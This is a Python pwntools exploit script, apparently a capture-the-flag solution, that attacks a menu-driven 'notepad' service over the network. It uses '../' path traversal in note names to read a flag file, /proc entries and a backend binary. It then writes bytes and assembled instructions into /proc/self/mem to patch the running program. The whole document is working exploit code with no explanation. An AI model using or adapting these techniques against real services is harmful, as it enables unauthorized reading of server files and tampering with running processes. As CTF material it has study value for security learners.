from pwn import *
import random
import string
from tqdm import tqdm

context.log_level = "INFO"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"


def gen_rand_str(length: int):
    return "".join(random.choice(string.ascii_letters) for i in range(length))


def read_menu(r):
    log.debug("Reading menu")
    # for i in range(7):
    #     r.readline().decode().strip()
    r.recvuntil(b"> ").decode()


def login(r, username: str, password: str):
    read_menu(r)
    log.debug("Logging in")
    r.sendline(b"1")
    r.recvuntil(b"Username: ")
    r.sendline(username.encode())
    r.recvuntil(b"Password: ")
    r.sendline(password.encode())
    log.info(f"{r.recvline().decode().strip()} {username} {password}")


def register(r, username: str, password: str):
    read_menu(r)
    log.debug("Registering")
    r.sendline(b"2")
    r.recvuntil(b"Username: ")
    r.sendline(username.encode())
    r.recvuntil(b"Password: ")
    r.sendline(password.encode())
    log.info(f"{r.recvline().decode().strip()} {username} {password}")


def new_note(r, name: str, content: str):
    read_menu(r)
    log.debug("Creating note")
    r.sendline(b"3")
    r.recvuntil(b"Note Name: ")
    assert len(name) <= 128, f"Name length {len(name)} > 128"
    r.send(name.encode())
    r.recvuntil(b"Content Length: ")
    assert len(content) <= 1024, f"Content length {len(content)} > 1024"
    r.sendline(str(len(content)).encode())
    r.recvuntil(b"Content: ")
    r.send(content.encode())
    log.info(f"{r.recvline().decode().strip()} {name} {len(content)=}")


def edit_note(r, name: str, offset: int, content: bytes):
    if len(name) > 107:
        log.warning(f"Name length {len(name)} >= 128")
        return
    name = "/" * (107 - len(name)) + name
    read_menu(r)
    log.debug("Editing note")
    r.sendline(b"4")
    r.recvuntil(b"Note Name: ")
    assert len(name) <= 128, f"Name length {len(name)} > 128"
    r.send(name.encode())
    r.recvuntil(b"Offset: ")
    r.sendline(str(offset).encode())
    r.recvuntil(b"Content Length: ")
    assert len(content) <= 1024, f"Content length {len(content)} > 1024"
    r.sendline(str(len(content)).encode())
    r.recvuntil(b"Content: ")
    r.send(content)
    ret = r.recvline().decode().strip()
    log.info(f"`{ret}` {name} {offset=} {len(content)=}")


def show_note(r, name: str, offset: int) -> tuple[bytes, int]:
    if len(name) > 107:
        log.warning(f"Name length {len(name)} > 128")
        return b"", 0
    name = "/" * (107 - len(name)) + name
    read_menu(r)
    log.debug("Showing note")
    r.sendline(b"5")
    r.recvuntil(b"Note Name: ")
    r.send(name.encode())
    r.recvuntil(b"Offset: ")
    r.sendline(str(offset).encode())
    org = r.recvline()
    end = b"+==========      Notepad       ==========+\n"
    while not org.endswith(end):
        org += r.recvline()
    assert org.endswith(end), org
    if org == b"Read note failed.\n" + end:
        log.debug(f"{name} {offset=}")
        return org[: -len(end)], -1
    if org == b"Couldn't open the file.\n" + end:
        log.debug(f"{org} {name} {offset=}")
        return org[: -len(end)], -2
    if org == b"Couldn't open the file.\nRead note failed.\n" + end:
        log.debug(f"{org} {name} {offset=}")
        return org[: -len(end)], -3
    assert org.endswith(end), org
    content = org[: -len(end)]
    length = len(content)
    log.debug(f"{len(content)=} {offset=}c")
    return content, length


def stage1(r):
    try:
        user = gen_rand_str(8)
        password = gen_rand_str(8)
        log.info(f"Username: {user}")
        log.info(f"Password: {password}")
        register(r, user, password)
        login(r, user, password)
        fnames = [
            "flag_user",
            "/flag_user",
            "//flag_user",
        ]
        for i in range(30, 40):
            for fname in fnames:
                path = "../" * i + fname
                if len(path) > 128:
                    log.warning(f"Length: {len(path)}: {path}")
                    break
                log.debug(f"Length: {len(path)}: {path}")
                content, length = show_note(r, path, 0)
                if length < 0:
                    log.debug(f"{path} {length=}")
                    continue
                log.info(f"{content.decode()}")
                break
    except EOFError:
        log.error(r.recvline().decode())
        r.close()
    except Exception as e:
        print(e)
        r.close()


def get_file(r, name: str) -> bytes:
    if len(name) > 128:
        log.warning(f"Name length {len(name)} > 128")
        return b""
    # log.info(f"Reading {name}")
    rname = "/" * (107 - len(name)) + name
    # log.info(f"Reading {rname}")
    off = 0
    content = b""
    pbar = None
    while True:
        log.debug(f"Reading {name} {off=}")
        block, length = show_note(r, rname, off)
        if length < 0:
            log.debug(f"{name} {off=} Done")
            if off == 0:
                break
            else:
                break
        assert length == len(block), f"{length=} {len(block)=}"
        off += length
        content += block
        if pbar is None:
            pbar = tqdm()
        pbar.update(length)
    if pbar is not None:
        pbar.close()
    if len(content) == 0:
        log.warning(f"{name} {len(content)=}")
        return block
    return content


def get_backend(r):
    try:
        user = gen_rand_str(8)
        password = gen_rand_str(8)
        register(r, user, password)
        login(r, user, password)
        for i in range(20):
            file = get_file(r, f"../../../proc/{i}/cmdline")
            if b"backend" in file:
                log.info(file.decode())
                break
            print(len(file))
        return
        backend = get_file(
            r, "../../../home/notepad/backend_4050c20b6ca4118b63acd960cd1b9cd8"
        )
        with open("backend", "wb") as f:
            f.write(backend)
        log.info(f"Backend downloaded, size: {len(backend)}")
    except EOFError:
        log.error(r.recvline().decode())
        r.close()


def vmmap(maps: bytes) -> list:
    ret = []
    for line in maps.split(b"\n"):
        line = line.split(b" ")
        while b"" in line:
            line.remove(b"")
        lb, ub = line[0].split(b"-")
        lb = int(lb, 16)
        ub = int(ub, 16)
        perm = line[1].decode()
        if len(line) > 5:
            path = line[-1].decode()
        else:
            path = ""
        if perm == "r-xp" and path.startswith("/"):
            ret.append((lb, ub, path))
    return ret


def stage2(r):
    try:
        user = gen_rand_str(8)
        password = gen_rand_str(8)
        register(r, user, password)
        login(r, user, password)
        maps = get_file(r, "../../../proc/self/maps")
        print(maps.decode())
        pages = vmmap(maps.strip())
        log.info(pages)
        os.makedirs("maps", exist_ok=True)
        assert pages[0][2] == "/home/notepad/notepad", f"{pages[0]=}"
        log.info(pages[0])
        base = pages[0][0]
        login_pc = 0x57D + base
        log.info(f"{login_pc = :x}")
        edit_note(r, "../../../proc/self/mem", base + 0x60C, bytes([0x87, 0x87]))
        edit_note(
            r, "../../../proc/self/mem", base + 0x6F4, asm("lea rdi, [rbp-0x110+0x04]")
        )
        login(r, user, password)
    except EOFError:
        log.error(r.recvline().decode())
        r.close()


if __name__ == "__main__":
    with open("port", "r") as f:
        port = int(f.read())
    r = remote("10.113.184.121", port)
    # r = process(["./notepad"])
    # attach(r)
    print(f"Stage 1")
    stage1(r)
    print(f"Getting backend")
    get_backend(r)
    print(f"Stage 2")
    stage2(r)
